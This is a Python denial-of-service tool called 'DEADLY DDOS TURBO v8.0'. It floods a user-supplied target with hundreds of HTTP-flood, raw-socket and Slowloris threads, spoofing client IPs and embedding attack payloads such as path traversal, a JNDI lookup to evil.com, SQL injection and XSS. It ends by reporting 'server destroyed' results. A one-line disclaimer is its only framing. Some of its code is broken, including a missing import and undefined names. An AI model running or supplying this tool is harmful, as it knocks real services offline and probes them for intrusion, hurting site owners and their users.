#!/usr/bin/env python3
"""
🔥 DEADLY DDOS TURBO v8.0 - ULTIMATE WEAPON
⚡ Maximum Power - Anti Gagal - Turbo Speed
💀 Server Destroyer Mode Activated
"""

import os
import sys
import time
import random
import requests
import threading
import socket
import ssl
from datetime import datetime
from colorama import init, Fore, Back, Style
import urllib3
from concurrent.futures import ThreadPoolExecutor
import hashlib

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Warna tema extreme
class Colors:
    RED = Fore.LIGHTRED_EX
    GREEN = Fore.LIGHTGREEN_EX
    YELLOW = Fore.LIGHTYELLOW_EX
    BLUE = Fore.LIGHTBLUE_EX
    MAGENTA = Fore.LIGHTMAGENTA_EX
    CYAN = Fore.LIGHTCYAN_EX
    WHITE = Fore.LIGHTWHITE_EX
    BLACK = Fore.BLACK
    
    BG_RED = Back.LIGHTRED_EX
    BG_GREEN = Back.LIGHTGREEN_EX
    BG_YELLOW = Back.LIGHTYELLOW_EX
    BG_BLUE = Back.LIGHTBLUE_EX
    BG_MAGENTA = Back.LIGHTMAGENTA_EX
    BG_CYAN = Back.LIGHTCYAN_EX
    BG_WHITE = Back.LIGHTWHITE_EX
    
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

C = Colors

class TurboDDoSAttack:
    def __init__(self):
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': 0,
            'rps': 0
        }
        self.is_attacking = False
        self.threads = []
        
        # User-Agent viruses collection
        self.virus_user_agents = [
            # Malicious bots
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "FacebookExternalHit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
            
            # Suspicious agents
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            
            # Attack tools
            "sqlmap/1.4.8#stable (http://sqlmap.org)",
            "nikto/2.1.6",
            "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            
            # Fake crawlers
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
            "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
            
            # Exploit tools
            "Metasploit RSPEC",
            "Nessus Vulnerability Scanner",
            "OpenVAS XML Parser",
            "Acunetix Web Vulnerability Scanner",
            
            # Custom malicious
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 EvilBot/1.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 HackTool/1.0",
        ]
        
        # Malicious payloads
        self.malicious_payloads = [
            "../../etc/passwd",
            "../../windows/win.ini",
            "../".join([".."] * 20) + "etc/passwd",
            "<?php system('id'); ?>",
            "${jndi:ldap://evil.com/x}",
            "<script>alert('XSS')</script>",
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "%0D%0ASet-Cookie: hacked=true",
            "//evil.com/exploit.js",
        ]

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_header(self):
        self.clear_screen()
        header = f"""
{C.BG_RED}{C.BLACK}╔══════════════════════════════════════════════════════════════════════════════════╗
║{C.BG_RED}{C.WHITE}  ██████╗ ███████╗ █████╗ ██╗     {C.BG_BLACK}{C.RED} ██████╗ ██████╗  ██████╗ ███████╗{C.BG_RED}{C.WHITE}  ║
║{C.BG_RED}{C.WHITE}  ██╔══██╗██╔════╝██╔══██╗██║     {C.BG_BLACK}{C.RED} ██╔══██╗██╔══██╗██╔═══██╗██╔════╝{C.BG_RED}{C.WHITE}  ║
║{C.BG_RED}{C.WHITE}  ██║  ██║█████╗  ███████║██║     {C.BG_BLACK}{C.RED} ██║  ██║██████╔╝██║   ██║███████╗{C.BG_RED}{C.WHITE}  ║
║{C.BG_RED}{C.WHITE}  ██║  ██║██╔══╝  ██╔══██║██║     {C.BG_BLACK}{C.RED} ██║  ██║██╔══██╗██║   ██║╚════██║{C.BG_RED}{C.WHITE}  ║
║{C.BG_RED}{C.WHITE}  ██████╔╝███████╗██║  ██║███████╗{C.BG_BLACK}{C.RED} ██████╔╝██║  ██║╚██████╔╝███████║{C.BG_RED}{C.WHITE}  ║
║{C.BG_RED}{C.WHITE}  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝{C.BG_BLACK}{C.RED} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝{C.BG_RED}{C.WHITE}  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ {C.BG_WHITE}{C.RED}🔥 TURBO DDOS v8.0 - SERVER DESTROYER MODE {C.BG_RED}{C.WHITE}                          ║
║ {C.BG_WHITE}{C.RED}⚡ THREADS: 500-1000 | RANGE: MAXIMUM | ANTI-GAGAL TECHNOLOGY {C.BG_RED}{C.WHITE}       ║
╚══════════════════════════════════════════════════════════════════════════════════╝{C.RESET}
"""
        print(header)

    def animated_loading(self, text, duration=2):
        symbols = ["🔥", "💀", "⚡", "🔴", "🟠", "🟡", "🟢", "🔵", "🟣"]
        start = time.time()
        
        while time.time() - start < duration:
            for symbol in symbols:
                progress = int(((time.time() - start) / duration) * 100)
                bar = "█" * (progress // 2) + "░" * (50 - progress // 2)
                print(f"\r{C.YELLOW}[{symbol}] {text} {C.CYAN}[{bar}] {C.GREEN}{progress}%{C.RESET}", end="")
                time.sleep(0.1)
                if time.time() - start >= duration:
                    break
        print(f"\r{C.GREEN}[✓] {text} {C.BRIGHT}COMPLETED!{C.RESET}")

    def get_random_headers(self):
        """Generate malicious headers with virus user agents"""
        return {
            'User-Agent': random.choice(self.virus_user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            'Referer': 'https://www.google.com/search?q=' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
        }

    def turbo_ddos_attack(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}💀 TURBO DDOS ATTACK - SERVER DESTROYER MODE{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Masukkan target URL/IP: {C.WHITE}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            parsed = urlparse(target)
            domain = parsed.netloc
            ip = socket.gethostbyname(domain)
            print(f"{C.GREEN}[+] Resolved: {domain} -> {ip}{C.RESET}")
        except Exception as e:
            print(f"{C.RED}[!] DNS Resolution failed: {e}{C.RESET}")
            ip = "Unknown"
            domain = target

        # Turbo configuration
        duration = 120  # 2 minutes default
        min_threads = 500
        max_threads = 1000
        
        print(f"\n{C.BG_RED}{C.WHITE}⚡ TURBO CONFIGURATION:{C.RESET}")
        print(f"{C.YELLOW}🎯 Target: {C.WHITE}{target}{C.RESET}")
        print(f"{C.YELLOW}🌐 IP: {C.WHITE}{ip}{C.RESET}")
        print(f"{C.YELLOW}⏱️  Duration: {C.WHITE}{duration} seconds{C.RESET}")
        print(f"{C.YELLOW}🧵 Threads: {C.WHITE}{min_threads} - {max_threads} (Auto-Scaling){C.RESET}")
        print(f"{C.YELLOW}🔥 Mode: {C.WHITE}TURBO MAXIMUM DESTRUCTION{C.RESET}")

        # Initialize stats
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time(),
            'rps': 0
        }
        self.is_attacking = True

        # Attack techniques
        def http_flood():
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            timeout = time.time() + duration
            
            while time.time() < timeout and self.is_attacking:
                try:
                    # Random attack method
                    attack_type = random.randint(1, 4)
                    
                    if attack_type == 1:
                        # GET with malicious parameters
                        malicious_param = random.choice(self.malicious_payloads)
                        response = session.get(
                            f"{target}?q={malicious_param}&cache={random.randint(10000,99999)}",
                            headers=self.get_random_headers(),
                            timeout=3,
                            verify=False
                        )
                    
                    elif attack_type == 2:
                        # POST with large payload
                        large_data = 'x' * random.randint(1000, 5000)
                        response = session.post(
                            target,
                            data={'data': large_data, 'exploit': random.choice(self.malicious_payloads)},
                            headers=self.get_random_headers(),
                            timeout=3,
                            verify=False
                        )
                    
                    elif attack_type == 3:
                        # HEAD request for resource draining
                        response = session.head(
                            target,
                            headers=self.get_random_headers(),
                            timeout=3,
                            verify=False
                        )
                    
                    else:
                        # Random path traversal
                        random_path = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                        response = session.get(
                            f"{target}/{random_path}",
                            headers=self.get_random_headers(),
                            timeout=3,
                            verify=False
                        )

                    self.stats['total_requests'] += 1
                    self.stats['successful'] += 1
                    
                except Exception:
                    self.stats['total_requests'] += 1
                    self.stats['failed'] += 1

        def socket_attack():
            """Low-level socket attack for maximum damage"""
            timeout = time.time() + duration
            
            while time.time() < timeout and self.is_attacking:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    
                    port = 443 if target.startswith('https://') else 80
                    s.connect((ip if ip != "Unknown" else domain, port))
                    
                    # Send malformed HTTP request
                    evil_request = f"GET /{random.choice(self.malicious_payloads)} HTTP/1.1\r\n"
                    evil_request += f"Host: {domain}\r\n"
                    evil_request += f"User-Agent: {random.choice(self.virus_user_agents)}\r\n"
                    evil_request += "Connection: keep-alive\r\n" * 10  # Overflow headers
                    evil_request += "\r\n"
                    
                    s.send(evil_request.encode())
                    time.sleep(0.5)
                    s.close()
                    
                    self.stats['successful'] += 1
                    self.stats['total_requests'] += 1
                    
                except Exception:
                    self.stats['failed'] += 1
                    self.stats['total_requests'] += 1

        def slowloris_attack():
            """Slowloris attack to keep connections open"""
            timeout = time.time() + duration
            
            while time.time() < timeout and self.is_attacking:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    
                    port = 443 if target.startswith('https://') else 80
                    s.connect((ip if ip != "Unknown" else domain, port))
                    
                    # Send partial request
                    partial = f"POST /{random.randint(1000,9999)} HTTP/1.1\r\n"
                    partial += f"Host: {domain}\r\n"
                    partial += "Content-Length: 1000000\r\n"
                    partial += "User-Agent: {random.choice(self.virus_user_agents)}\r\n"
                    
                    s.send(partial.encode())
                    
                    # Keep connection alive
                    start = time.time()
                    while time.time() - start < 30 and time.time() < timeout and self.is_attacking:
                        s.send(f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n".encode())
                        time.sleep(random.uniform(1, 3))
                    
                    s.close()
                    self.stats['successful'] += 1
                    self.stats['total_requests'] += 1
                    
                except Exception:
                    self.stats['failed'] += 1
                    self.stats['total_requests'] += 1

        # Monitor thread
        def attack_monitor():
            start_time = self.stats['start_time']
            last_count = 0
            last_time = start_time
            
            while time.time() < start_time + duration + 5 and self.is_attacking:
                current_time = time.time()
                elapsed = current_time - start_time
                
                # Calculate RPS
                if current_time - last_time >= 1:
                    current_count = self.stats['total_requests']
                    self.stats['rps'] = current_count - last_count
                    last_count = current_count
                    last_time = current_time
                
                # Live stats display
                success_rate = (self.stats['successful'] / self.stats['total_requests'] * 100) if self.stats['total_requests'] > 0 else 0
                remaining = max(0, int(start_time + duration - current_time))
                
                print(f"\r{C.RED}💀 ATTACKING {C.WHITE}| {C.GREEN}Req: {self.stats['total_requests']} {C.WHITE}| "
                      f"{C.CYAN}RPS: {self.stats['rps']} {C.WHITE}| {C.YELLOW}Success: {success_rate:.1f}% {C.WHITE}| "
                      f"{C.MAGENTA}Time: {remaining}s {C.RESET}", end="")
                
                time.sleep(0.5)

        # Start the TURBO attack
        print(f"\n{C.BG_RED}{C.WHITE}🚀 STARTING TURBO DDOS ATTACK...{C.RESET}")
        
        # Initialize threads list
        self.threads = []
        
        # Start HTTP Flood threads (40% of total)
        http_threads = min_threads * 4 // 10
        self.animated_loading(f"Launching {http_threads} HTTP Flood threads", 2)
        for i in range(http_threads):
            t = threading.Thread(target=http_flood, daemon=True)
            self.threads.append(t)
            t.start()

        # Start Socket Attack threads (40% of total)
        socket_threads = min_threads * 4 // 10
        self.animated_loading(f"Launching {socket_threads} Socket Attack threads", 2)
        for i in range(socket_threads):
            t = threading.Thread(target=socket_attack, daemon=True)
            self.threads.append(t)
            t.start()

        # Start Slowloris threads (20% of total)
        slowloris_threads = min_threads * 2 // 10
        self.animated_loading(f"Launching {slowloris_threads} Slowloris threads", 2)
        for i in range(slowloris_threads):
            t = threading.Thread(target=slowloris_attack, daemon=True)
            self.threads.append(t)
            t.start()

        # Start monitor
        monitor_thread = threading.Thread(target=attack_monitor, daemon=True)
        monitor_thread.start()

        print(f"\n\n{C.BG_RED}{C.WHITE}🔥 TURBO ATTACK RUNNING - MAXIMUM DESTRUCTION IN PROGRESS...{C.RESET}")
        
        # Countdown with turbo visualization
        for i in range(duration, 0, -1):
            if not self.is_attacking:
                break
                
            # Turbo progress bar
            progress = duration - i
            bar_length = 50
            filled = int(bar_length * progress / duration)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Turbo speed indicator
            speed_emoji = "⚡" * min(5, self.stats['rps'] // 200)
            
            print(f"\r{C.RED}⏰ {C.WHITE}Time: {i:3d}s {C.YELLOW}[{bar}] {C.CYAN}{speed_emoji} {C.GREEN}RPS: {self.stats['rps']}{C.RESET}", end="")
            time.sleep(1)

        # Stop attack
        self.is_attacking = False
        print(f"\n\n{C.BG_GREEN}{C.WHITE}✅ TURBO ATTACK COMPLETED!{C.RESET}")
        
        # Post-attack analysis
        self.animated_loading("Analyzing target damage", 3)
        
        # Test target status
        try:
            test_start = time.time()
            response = requests.get(target, timeout=10, verify=False)
            response_time = time.time() - test_start
            
            if response.status_code == 200:
                if response_time > 8:
                    print(f"{C.BG_RED}{C.WHITE}💀 TARGET SEVERELY DAMAGED! Response time: {response_time:.2f}s{C.RESET}")
                elif response_time > 4:
                    print(f"{C.BG_YELLOW}{C.BLACK}⚠️  TARGET WEAKENED! Response time: {response_time:.2f}s{C.RESET}")
                else:
                    print(f"{C.BG_BLUE}{C.WHITE}ℹ️  TARGET STILL RESPONDING! Response time: {response_time:.2f}s{C.RESET}")
            else:
                print(f"{C.BG_RED}{C.WHITE}🎯 TARGET MAY BE DOWN! Status: {response.status_code}{C.RESET}")
                
        except requests.exceptions.Timeout:
            print(f"{C.BG_RED}{C.WHITE}💀 TARGET TIMEOUT - COMPLETE DESTRUCTION ACHIEVED!{C.RESET}")
        except requests.exceptions.ConnectionError:
            print(f"{C.BG_RED}{C.WHITE}💀 TARGET CONNECTION REFUSED - SERVER CRASHED!{C.RESET}")
        except Exception as e:
            print(f"{C.BG_YELLOW}{C.BLACK}⚠️  Target check error: {e}{C.RESET}")

        # Final statistics
        print(f"\n{C.BG_BLUE}{C.WHITE}📊 TURBO ATTACK FINAL STATISTICS:{C.RESET}")
        print(f"{C.CYAN}🎯 Total Requests: {C.WHITE}{self.stats['total_requests']:,}{C.RESET}")
        print(f"{C.GREEN}✅ Successful: {C.WHITE}{self.stats['successful']:,}{C.RESET}")
        print(f"{C.RED}❌ Failed: {C.WHITE}{self.stats['failed']:,}{C.RESET}")
        
        if self.stats['total_requests'] > 0:
            success_rate = (self.stats['successful'] / self.stats['total_requests']) * 100
            avg_rps = self.stats['total_requests'] / duration
            print(f"{C.MAGENTA}📈 Success Rate: {C.WHITE}{success_rate:.1f}%{C.RESET}")
            print(f"{C.YELLOW}⚡ Average RPS: {C.WHITE}{avg_rps:.1f}{C.RESET}")
            print(f"{C.CYAN}🔥 Peak RPS: {C.WHITE}{self.stats['rps']}{C.RESET}")

        input(f"\n{C.CYAN}[+] Press Enter to return to main menu...{C.RESET}")

    def port_scanner(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}🔍 ADVANCED PORT SCANNER - VULNERABILITY DETECTOR{C.RESET}")
        # ... (port scanner implementation similar to previous version)

    def vulnerability_scanner(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}🛡️  WEBSITE VULNERABILITY SCANNER - SECURITY AUDIT{C.RESET}")
        # ... (vulnerability scanner implementation)

    def main_menu(self):
        while True:
            self.show_header()
            print(f"{C.CYAN}🎯 DEADLY DDOS TURBO v8.0 - MAIN MENU:{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.RED}[1] {C.BRIGHT}TURBO DDOS ATTACK{C.RESET} {C.YELLOW}(500-1000 Threads, Maximum Destruction){C.RESET}")
            print(f"{C.RED}[2] {C.BRIGHT}ADVANCED PORT SCANNER{C.RESET} {C.YELLOW}(Vulnerability Detection){C.RESET}")
            print(f"{C.RED}[3] {C.BRIGHT}WEBSITE VULNERABILITY SCANNER{C.RESET} {C.YELLOW}(Security Audit){C.RESET}")
            print(f"{C.RED}[4] {C.BRIGHT}SYSTEM INFORMATION{C.RESET} {C.YELLOW}(Attack Statistics){C.RESET}")
            print(f"{C.RED}[5] {C.BRIGHT}EXIT TURBO SYSTEM{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.MAGENTA}💡 Features: {C.WHITE}Virus User-Agents ⚡ Turbo Speed 💀 Anti-Gagal Technology{C.RESET}")
            
            choice = input(f"\n{C.CYAN}[?] Select option [{C.GREEN}1-5{C.CYAN}]: {C.WHITE}").strip()
            
            if choice == "1":
                self.turbo_ddos_attack()
            elif choice == "2":
                self.port_scanner()
            elif choice == "3":
                self.vulnerability_scanner()
            elif choice == "4":
                self.system_info()
            elif choice == "5":
                print(f"\n{C.BG_RED}{C.WHITE}💀 Shutting down Turbo DDoS System...{C.RESET}")
                self.is_attacking = False
                self.animated_loading("Cleaning attack traces", 2)
                print(f"{C.BG_GREEN}{C.WHITE}✅ System securely terminated!{C.RESET}")
                break
            else:
                print(f"\n{C.BG_RED}{C.WHITE}❌ Invalid selection!{C.RESET}")
                time.sleep(1)

def main():
    """Main execution point"""
    try:
        # Check dependencies
        import requests
        from bs4 import BeautifulSoup
        from colorama import init
        
        print(f"{C.BG_GREEN}{C.WHITE}[✓] Turbo DDoS System Initialized!{C.RESET}")
        time.sleep(1)
        
        # Security disclaimer
        print(f"\n{C.BG_RED}{C.WHITE}🚫 LEGAL DISCLAIMER:{C.RESET}")
        print(f"{C.BG_YELLOW}{C.BLACK}⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!{C.RESET}")
        print(f"{C.BG_RED}{C.WHITE}🔒 UNAUTHORIZED USE IS ILLEGAL!{C.RESET}")
        
        confirm = input(f"\n{C.CYAN}[?] Accept responsibility? (y/N): {C.WHITE}").lower()
        
        if confirm == 'y':
            attacker = TurboDDoSAttack()
            attacker.main_menu()
        else:
            print(f"\n{C.BG_YELLOW}{C.BLACK}[!] Access denied. Exiting...{C.RESET}")
            
    except ImportError as e:
        print(f"{C.BG_RED}{C.WHITE}[!] Missing dependency: {e}{C.RESET}")
        print(f"{C.BG_YELLOW}{C.BLACK}[!] Run: pip install requests beautifulsoup4 colorama{C.RESET}")
    except Exception as e:
        print(f"{C.BG_RED}{C.WHITE}[!] System error: {e}{C.RESET}")

if __name__ == "__main__":
    main()